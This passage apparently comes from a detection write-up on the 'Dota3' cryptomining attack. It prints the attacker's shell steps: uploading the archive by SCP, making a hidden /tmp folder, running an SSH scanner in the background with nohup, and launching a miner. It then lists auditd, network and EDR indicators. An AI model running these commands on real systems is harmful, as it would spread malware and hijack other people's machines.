upload the tools via SCP
```shell-session
user@bot-1672$ scp dota3.tar.gz ubuntu@victim:/tmp
[OK] Transfered dota3.tar.gz file to the victim
```

```bash
# Prepare a hidden /tmp/.X26-unix folder for malware
cd /tmp
rm -rf .X2*
mkdir .X26-unix
cd .X26-unix
# Unarchive malware to /tmp/.X26-unix/.rsync/c folder
tar xf dota3.tar.gz
sleep 3s
cd /tmp/.X26-unix/.rsync/c
```

`nohup`, a command that allows the processes to continue running in the background even after the SSH session is closed.
```bash
# Scan the internal network with the "tsm" malware
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1&
sleep 8m
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>1&
sleep 20m
# Run the actual cryptominer named "initall"
cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
# That's it, Dota3 attack is now completed!
exit 0
```

## Detection
- **Auditd logs**: Creation of untrusted, hidden files and folders in the /tmp directory
- **Auditd logs**: Creation of files named like known malware, such as dota3.tar.gz
- **Auditd logs**: Usage of commands often observed in attacks, such as nohup
- **Network traffic**: SSH port scan of the whole 192.168.* and 172.16.* networks
- **EDR solution**: The XMrig cryptominer binary is blocked by most EDRs ([VirusTotal Example](https://www.virustotal.com/gui/file/fb1f928c2dbfd108da2d93b9e07a8d97526dc378dc342d405f3991ad6bec969d/details))

